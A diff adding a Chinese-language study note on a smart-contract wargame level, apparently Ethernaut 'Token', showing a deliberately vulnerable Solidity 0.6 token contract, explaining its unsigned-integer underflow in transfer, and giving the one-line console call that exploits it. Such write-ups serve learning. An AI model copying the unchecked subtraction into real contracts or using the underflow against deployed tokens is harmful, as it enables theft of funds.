@@ -15,6 +15,66 @@ web3萌新
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-21
+
+## 5.Token
+
+这一关的目标是攻破下面这个基础 token 合约
+
+你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好
+
+ 这可能有帮助:
+
+- 什么是 odometer?指的是整数溢出/下溢
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+    mapping(address => uint256) balances;
+    uint256 public totalSupply;
+
+    constructor(uint256 _initialSupply) public {
+        balances[msg.sender] = totalSupply = _initialSupply;
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        require(balances[msg.sender] - _value >= 0);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+        return true;
+    }
+
+    function balanceOf(address _owner) public view returns (uint256 balance) {
+        return balances[_owner];
+    }
+}
+```
+
+漏洞点
+
+```solidity
+require(balances[msg.sender] - _value >= 0);
+balances[msg.sender] -= _value;
+balances[_to] += _value;
+
+```
+
+表达式 balances[msg.sender] - _value 先计算,比如这里初始余额为20，转入21的value。
+
+就会变成20-21 = -1
+
+但是由于是uint不存在负数，根据计算机补码的显示规则会显示为一个超大的整数，因此balances[msg.sender]会是一个超级大数字。
+
+攻击：
+
+await contract.transfer('0xEEC56C8d81E9231Ac214096c0a251a0948D69aE3',21)
+
+查看
+
+await contract.balanceOf(player)
+
 # 2025-08-20
 
 ## 4.Telephone
